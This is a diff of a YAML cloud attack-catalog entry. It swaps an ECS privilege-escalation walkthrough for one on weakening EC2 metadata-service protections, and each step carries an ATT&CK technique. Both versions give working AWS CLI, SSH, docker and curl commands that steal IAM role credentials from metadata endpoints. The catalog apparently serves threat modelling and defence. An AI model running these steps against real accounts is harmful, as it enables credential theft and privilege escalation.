@@ -1,56 +1,44 @@
 attack:
-  id: 'aws-ecs-privesc-001'
-  name: 'Privilege Escalation to ECS via EC2 Instance Registration'
+  id: 'aws-ec2-modify-imds-options-001'
+  name: 'EC2 Instance Metadata Service (IMDS) Protection Weakening'
   overview: |
-    This attack leverages EC2 permissions to create a new EC2 instance and register it within an existing ECS cluster. By launching an ECS-optimized AMI with custom user data that configures the ECS agent to join a target cluster, the attacker gains access to the underlying EC2 host. Once the instance is registered, ECS services and tasks will be scheduled on this attacker-controlled instance, allowing the attacker to access running Docker containers and steal IAM roles attached to ECS tasks.
+    This attack exploits the ec2:ModifyInstanceMetadataOptions permission to weaken Instance Metadata Service (IMDS) security controls on EC2 instances. An attacker can modify IMDS settings to either force IMDSv1 (by setting HttpTokens to optional) or increase the HttpPutResponseHopLimit value. The most critical risk is increasing the hop limit, which extends the reachability of the metadata endpoint (169.254.169.254) beyond the VM's network namespace, allowing other processes, containers, or adjacent workloads to access and exfiltrate temporary IAM credentials attached to the instance role.
   steps:
-    - title: 'Create EC2 Instance with ECS Configuration'
+    - title: 'Identify Target EC2 Instance'
       command: |
-        aws ec2 run-instances \
-            --image-id ami-07fde2ae86109a2af \
-            --instance-type t2.micro \
-            --iam-instance-profile <ECS_role> \
-            --count 1 --key-name pwned \
-            --user-data "file:///tmp/asd.sh"
+        aws ec2 describe-instances --query 'Reservations[*].Instances[*].[InstanceId,MetadataOptions]' --output table
       dependencies:
-        - 'ec2:RunInstances permission'
-        - 'iam:PassRole permission for the ECS instance profile'
-        - 'Pre-existing SSH key pair (pwned) in the target region'
-        - 'ECS-optimized AMI ID (e.g., amzn2-ami-ecs-hvm-2.0.20210520-x86_64-ebs)'
-        - 'User data script file at /tmp/asd.sh'
+        - 'ec2:DescribeInstances permission'
+        - 'Valid AWS credentials with appropriate access'
+        - 'Network access to AWS API endpoints'
       result: |
-        A new EC2 instance is launched with the ECS agent configured to register with the target cluster. The attacker has SSH access via the specified key pair.
-      ttp: 'T1578.002 - Modify Cloud Compute Infrastructure: Create Cloud Instance'
-    - title: 'Configure ECS Agent via User Data Script'
+        Returns a list of EC2 instances with their current metadata configuration, allowing the attacker to identify targets with IMDSv2 enforced or low hop limits that can be weakened.
+      ttp: 'T1580 - Cloud Infrastructure Discovery'
+    - title: 'Weaken IMDS Protections'
       command: |
-        #!/bin/bash
-        echo ECS_CLUSTER=<cluster-name> >> /etc/ecs/ecs.config
-        echo ECS_BACKEND_HOST= >> /etc/ecs/ecs.config
+        aws ec2 modify-instance-metadata-options \
+          --instance-id <INSTANCE_ID> \
+          --http-tokens optional \
+          --http-endpoint enabled \
+          --http-put-response-hop-limit 2
       dependencies:
-        - 'Knowledge of target ECS cluster name'
-        - 'EC2 instance profile with AmazonEC2ContainerServiceforEC2Role or equivalent permissions'
+        - 'ec2:ModifyInstanceMetadataOptions permission'
+        - 'Target instance ID obtained from reconnaissance'
+        - 'Instance must be in running or stopped state'
       result: |
-        The EC2 instance automatically registers with the specified ECS cluster upon boot, becoming available to run ECS tasks and services.
-      ttp: 'T1059.004 - Command and Scripting Interpreter: Unix Shell'
-    - title: 'Access Docker Containers and Steal ECS Task Roles'
+        IMDS protections are weakened: IMDSv1 is re-enabled (http-tokens set to optional), and the hop limit is increased to 2, allowing metadata requests from containers or adjacent network namespaces to reach the metadata endpoint.
+      ttp: 'T1562.001 - Impair Defenses: Disable or Modify Tools'
+    - title: 'Exfiltrate Instance Role Credentials'
       command: |
-        # SSH into the compromised instance
-        ssh -i pwned.pem ec2-user@<instance-public-ip>
-        
-        # List running containers
-        docker ps
-        
-        # Access container and retrieve task role credentials
-        docker exec -it <container-id> /bin/sh
-        curl http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI
+        curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE_NAME>
       dependencies:
-        - 'SSH access to the EC2 instance'
-        - 'ECS tasks scheduled on the compromised instance'
-        - 'Docker CLI access on the host'
-        - 'ECS tasks with attached IAM roles'
+        - 'Network access to metadata endpoint from compromised container or adjacent process'
+        - 'EC2 instance must have an IAM role attached'
+        - 'IMDS protections successfully weakened in previous step'
       result: |
-        The attacker gains access to running containers and can retrieve temporary IAM credentials from the ECS task metadata endpoint, effectively assuming the IAM roles attached to ECS tasks.
+        Temporary IAM credentials (AccessKeyId, SecretAccessKey, and SessionToken) are retrieved from the instance metadata service, enabling the attacker to assume the instance's IAM role and perform actions with those privileges outside the instance.
       ttp: 'T1552.005 - Unsecured Credentials: Cloud Instance Metadata API'
   stride_goal:
-    - 'Elevation of Privilege'
+    - 'Tampering'
     - 'Information Disclosure'
+    - 'Elevation of Privilege'
